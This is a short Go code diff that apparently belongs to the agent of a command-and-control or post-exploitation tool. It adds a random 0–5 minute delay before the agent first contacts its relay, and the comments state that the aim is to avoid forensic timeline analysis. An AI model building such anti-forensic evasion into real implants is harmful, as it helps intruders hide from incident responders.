@@ -64,6 +64,16 @@ func agent_main() {
 		}
 	}()
 
+	// Startup jitter: a host that dials the relay the second it boots ties
+	// the relay domain to the boot event in any timeline analysis. Wait a
+	// random 0-5min before ANY network activity (DoH bootstrap included).
+	// EMP_NO_STARTUP_JITTER=1 skips this for operator-driven restarts/tests.
+	if os.Getenv("EMP_NO_STARTUP_JITTER") == "" {
+		delay := time.Duration(util.RandInt(0, 300)) * time.Second
+		logging.Warningf("startup jitter: first connection in %v", delay)
+		time.Sleep(delay)
+	}
+
 	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 	if err != nil {
 		logging.Fatalf("%s: %v", os.DevNull, err)
